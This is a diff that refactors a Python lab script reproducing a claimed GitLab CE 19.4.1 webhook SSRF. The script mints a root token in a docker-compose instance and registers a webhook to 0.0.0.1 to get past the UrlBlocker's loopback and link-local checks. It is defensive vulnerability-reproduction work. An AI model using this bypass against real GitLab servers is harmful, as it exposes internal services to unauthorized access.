@@ -226,75 +226,117 @@ _builtins.print = _cprint
 
 """GitLab CE 19.4.1 webhook SSRF via UrlBlocker 0.0.0.0/8 hole."""
 
-
 import json
 import os
 import subprocess
-import sys
 import time
 import urllib.error
 import urllib.parse
 import urllib.request
+from dataclasses import dataclass
+from pathlib import Path
 
 WITNESS = "GITLAB-WEBHOOK-0NET-SSRF-WITNESS"
 LABEL = "GITLAB-WEBHOOK-0NET-SSRF"
-GITLAB = os.environ.get("GITLAB_URL", "http://127.0.0.1:18420").rstrip("/")
-COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "gitlab-webhook-0net-ssrf")
-HERE = os.path.dirname(os.path.abspath(__file__))
+DEFAULT_GITLAB = "http://127.0.0.1:18420"
+DEFAULT_COMPOSE_PROJECT = "gitlab-webhook-0net-ssrf"
 CATCHER_URL = "http://0.0.0.1:18080/"
 LOOPBACK_URL = "http://127.0.0.1:18080/"
 LINKLOCAL_URL = "http://169.254.169.254/"
-READY_TIMEOUT = int(os.environ.get("GITLAB_READY_TIMEOUT", "1200"))
+DEFAULT_READY_TIMEOUT = 1200
+OK_STATUSES = (200, 201)
+BLOCKED_STATUSES = (400, 422)
+BLOCKED_NEEDLES = (
+    "is blocked",
+    "invalid url",
+    "localhost",
+    "loopback",
+    "link local",
+    "local network",
+    "not allowed",
+    "blocked url",
+)
+MINT_PAT_RUBY = r"""
+user = User.find_by_username('root')
+raise 'no root user' unless user
+user.personal_access_tokens.where(name: 'cve-lab-webhook-0net').find_each(&:revoke!)
+pat = user.personal_access_tokens.create!(
+  name: 'cve-lab-webhook-0net',
+  scopes: [:api],
+  expires_at: 364.days.from_now
+)
+puts "PAT=#{pat.token}"
+"""
+HOOK_LOG_RUBY = r"puts WebHookLog.order(:created_at).last&.response_body.to_s"
+
+
+@dataclass(frozen=True)
+class LabConfig:
+    gitlab: str
+    compose_project: str
+    here: Path
+    ready_timeout: int
+
+    @classmethod
+    def from_env(cls) -> LabConfig:
+        return cls(
+            gitlab=os.environ.get("GITLAB_URL", DEFAULT_GITLAB).rstrip("/"),
+            compose_project=os.environ.get("COMPOSE_PROJECT_NAME", DEFAULT_COMPOSE_PROJECT),
+            here=Path(__file__).resolve().parent,
+            ready_timeout=int(os.environ.get("GITLAB_READY_TIMEOUT", str(DEFAULT_READY_TIMEOUT))),
+        )
+
+
+class LabFailure(Exception):
+    """Abort the lab; main() prints FAIL {LABEL} {reason} and returns 1."""
+
+    def __init__(self, reason: str) -> None:
+        super().__init__(reason)
+        self.reason = reason
 
 
 def log(msg: str) -> None:
     print(msg, flush=True)
 
 
-def fail(reason: str) -> None:
+def fail(reason: str) -> int:
     log(f"FAIL {LABEL} {reason}")
-    raise SystemExit(1)
+    return 1
 
 
-def success(detail: str) -> None:
+def success(detail: str) -> int:
     log(f"SUCCESS {LABEL} {detail} {WITNESS}")
-    raise SystemExit(0)
+    return 0
 
 
-def compose(*args: str, timeout: int = 120) -> subprocess.CompletedProcess[str]:
+def compose(
+    cfg: LabConfig, *args: str, timeout: int = 120
+) -> subprocess.CompletedProcess[str]:
     return subprocess.run(
-        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
-        cwd=HERE,
+        ["docker", "compose", "-p", cfg.compose_project, *args],
+        cwd=cfg.here,
         text=True,
         capture_output=True,
         timeout=timeout,
+        check=False,
     )
 
 
 def blocked_text(status: int, body: str) -> bool:
     blob = f"{status} {body}".lower()
-    needles = (
-        "is blocked",
-        "invalid url",
-        "localhost",
-        "loopback",
-        "link local",
-        "local network",
-        "not allowed",
-        "blocked url",
-    )
-    return status in (400, 422) and any(n in blob for n in needles)
+    return status in BLOCKED_STATUSES and any(n in blob for n in BLOCKED_NEEDLES)
 
 
 def http(
+    cfg: LabConfig,
     method: str,
     path: str,
     token: str | None = None,
-    payload: dict | None = None,
+    payload: dict[str, object] | None = None,
     timeout: int = 60,
 ) -> tuple[int, str]:
-    url = path if path.startswith("http") else f"{GITLAB}{path}"
-    data = None
+    url = path if path.startswith("http") else f"{cfg.gitlab}{path}"
+    data: bytes | None = None
     headers = {"Accept": "application/json"}
     if token:
         headers["PRIVATE-TOKEN"] = token
@@ -311,12 +353,12 @@ def http(
         return 0, str(exc.reason)
 
 
-def wait_ready() -> None:
-    deadline = time.time() + READY_TIMEOUT
+def wait_ready(cfg: LabConfig) -> None:
+    deadline = time.time() + cfg.ready_timeout
     last = "none"
     while time.time() < deadline:
         req = urllib.request.Request(
-            f"{GITLAB}/users/sign_in",
+            f"{cfg.gitlab}/users/sign_in",
             headers={"Accept": "text/html"},
             method="GET",
         )
@@ -331,30 +373,22 @@ def wait_ready() -> None:
             status = 0
             body = str(exc.reason)
         last = f"{status} {body[:80]!r}"
-        if status == 200 and ("sign_in" in body.lower() or "password" in body.lower() or "gitlab" in body.lower()):
+        lowered = body.lower()
+        if status == 200 and ("sign_in" in lowered or "password" in lowered or "gitlab" in lowered):
             log(f"gitlab-ready {last}")
             return
         log(f"gitlab-wait {last}")
         time.sleep(8)
-    fail(f"gitlab not ready after {READY_TIMEOUT}s last={last}")
+    raise LabFailure(f"gitlab not ready after {cfg.ready_timeout}s last={last}")
 
 
-def mint_pat() -> str:
-    ruby = r"""
-user = User.find_by_username('root')
-raise 'no root user' unless user
-user.personal_access_tokens.where(name: 'cve-lab-webhook-0net').find_each(&:revoke!)
-pat = user.personal_access_tokens.create!(
-  name: 'cve-lab-webhook-0net',
-  scopes: [:api],
-  expires_at: 364.days.from_now
-)
-puts "PAT=#{pat.token}"
-"""
+def mint_pat(cfg: LabConfig) -> str:
     last = ""
     for attempt in range(1, 9):
         log(f"mint-pat gitlab-rails runner attempt={attempt}")
-        proc = compose("exec", "-T", "gitlab", "gitlab-rails", "runner", ruby, timeout=300)
+        proc = compose(
+            cfg, "exec", "-T", "gitlab", "gitlab-rails", "runner", MINT_PAT_RUBY, timeout=300
+        )
         out = (proc.stdout or "") + (proc.stderr or "")
         last = f"rc={proc.returncode}"
         log(f"mint-pat {last}")
@@ -365,12 +399,13 @@ puts "PAT=#{pat.token}"
         err = out[-800:].replace("PAT=", "PAT=<redacted>=")
         last = f"rc={proc.returncode} out={err}"
         time.sleep(20)
-    fail(f"pat mint failed {last}")
+    raise LabFailure(f"pat mint failed {last}")
 
 
-def rails_log_body() -> str:
-    ruby = r"puts WebHookLog.order(:created_at).last&.response_body.to_s"
-    proc = compose("exec", "-T", "gitlab", "gitlab-rails", "runner", ruby, timeout=180)
+def rails_log_body(cfg: LabConfig) -> str:
+    proc = compose(
+        cfg, "exec", "-T", "gitlab", "gitlab-rails", "runner", HOOK_LOG_RUBY, timeout=180
+    )
     out = (proc.stdout or "").strip()
     if proc.returncode != 0:
         err = (proc.stderr or "")[-800:]
@@ -379,8 +414,9 @@ def rails_log_body() -> str:
     return out
 
 
-def catcher_probe() -> str:
+def catcher_probe(cfg: LabConfig) -> str:
     proc = compose(
+        cfg,
         "exec",
         "-T",
         "gitlab",
@@ -400,24 +436,29 @@ def catcher_probe() -> str:
     return body
 
 
-def create_project(token: str) -> int:
-    status, body = http("POST", "/api/v4/projects", token, {"name": "hook-lab", "visibility": "private"})
-    if status in (200, 201):
+def create_project(cfg: LabConfig, token: str) -> int:
+    status, body = http(
+        cfg, "POST", "/api/v4/projects", token, {"name": "hook-lab", "visibility": "private"}
+    )
+    if status in OK_STATUSES:
         pid = json.loads(body)["id"]
         log(f"project id={pid}")
         return int(pid)
     if status == 400 and "has already been taken" in body.lower():
-        status, body = http("GET", "/api/v4/projects?search=hook-lab&simple=true", token)
+        status, body = http(
+            cfg, "GET", "/api/v4/projects?search=hook-lab&simple=true", token
+        )
         if status == 200:
             for row in json.loads(body):
                 if row.get("name") == "hook-lab":
                     log(f"project reused id={row['id']}")
                     return int(row["id"])
-    fail(f"project create {status} {body[:500]}")
+    raise LabFailure(f"project create {status} {body[:500]}")
 
 
-def create_hook(token: str, project_id: int, url: str) -> tuple[int, str]:
+def create_hook(cfg: LabConfig, token: str, project_id: int, url: str) -> tuple[int, str]:
     status, body = http(
+        cfg,
         "POST",
         f"/api/v4/projects/{project_id}/hooks",
         token,
@@ -433,16 +474,22 @@ def create_hook(token: str, project_id: int, url: str) -> tuple[int, str]:
     return status, body
 
 
-def trigger_hook(token: str, project_id: int, hook_id: int) -> tuple[int, str]:
+def trigger_hook(
+    cfg: LabConfig, token: str, project_id: int, hook_id: int
+) -> tuple[int, str]:
     path = f"/api/v4/projects/{project_id}/hooks/{hook_id}/test/push_events"
-    status, body = http("POST", path, token, {}, timeout=90)
+    status, body = http(cfg, "POST", path, token, {}, timeout=90)
     log(f"hook-test status={status} body={body[:400]!r}")
     return status, body
 
 
-def commit_trigger(token: str, project_id: int) -> None:
-    path = f"/api/v4/projects/{project_id}/repository/files/{urllib.parse.quote('lab.txt', safe='')}"
+def commit_trigger(cfg: LabConfig, token: str, project_id: int) -> None:
+    path = (
+        f"/api/v4/projects/{project_id}/repository/files/"
+        f"{urllib.parse.quote('lab.txt', safe='')}"
+    )
     status, body = http(
+        cfg,
         "POST",
         path,
         token,
@@ -453,11 +500,12 @@ def commit_trigger(token: str, project_id: int) -> None:
         },
         timeout=60,
     )
-    if status in (200, 201):
+    if status in OK_STATUSES:
         log("commit-trigger ok")
         return
     if status == 400:
         status, body = http(
+            cfg,
             "PUT",
             path,
             token,
@@ -469,13 +517,15 @@ def commit_trigger(token: str, project_id: int) -> None:
             timeout=60,
         )
         log(f"commit-trigger put status={status}")
-        if status in (200, 201):
+        if status in OK_STATUSES:
             return
-    fail(f"commit trigger {status} {body[:400]}")
+    raise LabFailure(f"commit trigger {status} {body[:400]}")
 
 
-def hook_events_body(token: str, project_id: int, hook_id: int) -> str:
-    status, body = http("GET", f"/api/v4/projects/{project_id}/hooks/{hook_id}/events", token)
+def hook_events_body(cfg: LabConfig, token: str, project_id: int, hook_id: int) -> str:
+    status, body = http(
+        cfg, "GET", f"/api/v4/projects/{project_id}/hooks/{hook_id}/events", token
+    )
     log(f"hook-events status={status} body={body[:600]!r}")
     if status != 200:
         return ""
@@ -483,7 +533,7 @@ def hook_events_body(token: str, project_id: int, hook_id: int) -> str:
         rows = json.loads(body)
     except json.JSONDecodeError:
         return body
-    texts = []
+    texts: list[str] = []
     if isinstance(rows, list):
         for row in rows:
             if isinstance(row, dict):
@@ -491,71 +541,80 @@ def hook_events_body(token: str, project_id: int, hook_id: int) -> str:
     return "\n".join(texts)
 
 
-def main() -> None:
-    log(f"lab {LABEL} gitlab={GITLAB} catcher={CATCHER_URL}")
-    wait_ready()
+def run_lab(cfg: LabConfig) -> int:
+    log(f"lab {LABEL} gitlab={cfg.gitlab} catcher={CATCHER_URL}")
+    wait_ready(cfg)
 
-    probe = catcher_probe()
+    probe = catcher_probe(cfg)
     if WITNESS not in probe:
-        fail("kernel does not deliver 0.0.0.1 to catcher (or catcher not bound)")
+        raise LabFailure("kernel does not deliver 0.0.0.1 to catcher (or catcher not bound)")
 
-    token = mint_pat()
-    project_id = create_project(token)
+    token = mint_pat(cfg)
+    project_id = create_project(cfg, token)
 
-    neg_a_status, neg_a_body = create_hook(token, project_id, LOOPBACK_URL)
+    neg_a_status, neg_a_body = create_hook(cfg, token, project_id, LOOPBACK_URL)
     if not blocked_text(neg_a_status, neg_a_body):
-        fail(f"NEGATIVE A 127.0.0.1 expected 422 blocked got {neg_a_status} {neg_a_body[:200]}")
+        raise LabFailure(
+            f"NEGATIVE A 127.0.0.1 expected 422 blocked got {neg_a_status} {neg_a_body[:200]}"
+        )
     log("negative-a 127.0.0.1 blocked")
 
-    neg_b_status, neg_b_body = create_hook(token, project_id, LINKLOCAL_URL)
+    neg_b_status, neg_b_body = create_hook(cfg, token, project_id, LINKLOCAL_URL)
     if not blocked_text(neg_b_status, neg_b_body):
-        fail(f"NEGATIVE B 169.254.169.254 expected 422 blocked got {neg_b_status} {neg_b_body[:200]}")
+        raise LabFailure(
+            f"NEGATIVE B 169.254.169.254 expected 422 blocked got "
+            f"{neg_b_status} {neg_b_body[:200]}"
+        )
     log("negative-b link-local blocked")
 
-    pos_status, pos_body = create_hook(token, project_id, CATCHER_URL)
-    if pos_status in (400, 422) and blocked_text(pos_status, pos_body):
-        fail(f"0.0.0.1 is blocked ({pos_status} {pos_body[:200]})")
-    if pos_status not in (200, 201):
-        fail(f"positive hook create {pos_status} {pos_body[:300]}")
+    pos_status, pos_body = create_hook(cfg, token, project_id, CATCHER_URL)
+    if pos_status in BLOCKED_STATUSES and blocked_text(pos_status, pos_body):
+        raise LabFailure(f"0.0.0.1 is blocked ({pos_status} {pos_body[:200]})")
+    if pos_status not in OK_STATUSES:
+        raise LabFailure(f"positive hook create {pos_status} {pos_body[:300]}")
 
     try:
         hook_id = int(json.loads(pos_body)["id"])
-    except (json.JSONDecodeError, KeyError, TypeError, ValueError):
-        fail(f"positive hook missing id {pos_body[:300]}")
+    except (json.JSONDecodeError, KeyError, TypeError, ValueError) as exc:
+        raise LabFailure(f"positive hook missing id {pos_body[:300]}") from exc
     log(f"positive-hook id={hook_id}")
 
-    test_status, test_body = trigger_hook(token, project_id, hook_id)
+    test_status, _test_body = trigger_hook(cfg, token, project_id, hook_id)
     if test_status == 404:
         log("hook test endpoint 404; falling back to dummy commit")
-        commit_trigger(token, project_id)
+        commit_trigger(cfg, token, project_id)
         time.sleep(8)
     elif test_status == 429:
         log("hook test rate-limited; waiting then dummy commit")
         time.sleep(15)
-        commit_trigger(token, project_id)
+        commit_trigger(cfg, token, project_id)
         time.sleep(8)
 
-    blob = hook_events_body(token, project_id, hook_id)
+    blob = hook_events_body(cfg, token, project_id, hook_id)
     if WITNESS not in blob:
         log("rest events missed witness; rails WebHookLog")
-        blob = rails_log_body()
+        blob = rails_log_body(cfg)
         log(f"rails-log body={blob[:400]!r}")
 
     if WITNESS in blob:
-        success(f"webhook response_body from 0.0.0.1:18080 hook_id={hook_id}")
+        return success(f"webhook response_body from 0.0.0.1:18080 hook_id={hook_id}")
 
-    catcher_logs = compose("logs", "--tail=40", "catcher", timeout=30)
+    catcher_logs = compose(cfg, "logs", "--tail=40", "catcher", timeout=30)
     log("catcher-logs " + ((catcher_logs.stdout or "") + (catcher_logs.stderr or ""))[-1500:])
-    if test_status in (200, 201) and WITNESS not in blob:
-        fail("hook test returned success but response_body missing witness")
-    fail("kernel/webhook did not return witness in hook log")
+    if test_status in OK_STATUSES and WITNESS not in blob:
+        raise LabFailure("hook test returned success but response_body missing witness")
+    raise LabFailure("kernel/webhook did not return witness in hook log")
+
+
+def main() -> int:
+    try:
+        return run_lab(LabConfig.from_env())
+    except LabFailure as exc:
+        return fail(exc.reason)
+    except Exception as exc:
+        return fail(f"exception {type(exc).__name__}: {exc}")
 
 
 if __name__ == "__main__":
-    try:
-        main()
-    except SystemExit:
-        raise
-    except Exception as exc:  # noqa: BLE001 — last-line FAIL contract
-        fail(f"exception {type(exc).__name__}: {exc}")
+    raise SystemExit(main())
 
